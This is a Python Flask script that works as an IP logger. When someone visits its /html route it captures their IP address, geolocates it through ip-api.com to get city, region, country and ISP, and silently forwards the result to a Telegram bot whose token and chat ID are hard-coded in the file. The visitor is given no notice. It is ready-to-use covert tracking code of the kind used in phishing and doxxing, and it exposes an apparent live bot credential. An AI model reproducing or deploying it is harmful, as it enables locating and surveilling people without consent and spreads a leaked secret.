import subprocess
import sys

# Auto install
try:
    import requests
    from flask import Flask, request, render_template
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "flask", "requests"])
    import requests
    from flask import Flask, request, render_template

app = Flask(__name__)

# 🔑 YOUR TELEGRAM CONFIG
BOT_TOKEN = "7140462385:AAEMlQkmWwwINpGCY10W1e-i1Weq-1HBBbM"
CHAT_ID = "6656858850"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    try:
        requests.post(url, data=data, timeout=5)
    except:
        pass

def get_info(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        return res.json()
    except:
        return {}

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/html")
def collect():
    ip = request.remote_addr
    info = get_info(ip)

    message = f"""
🌐 New Visit
IP: {ip}
City: {info.get("city")}
Region: {info.get("regionName")}
Country: {info.get("country")}
ISP: {info.get("isp")}
    """

    send_to_telegram(message)

    return {"status": "ok"}

if __name__ == "__main__":
    app.run(debug=True)
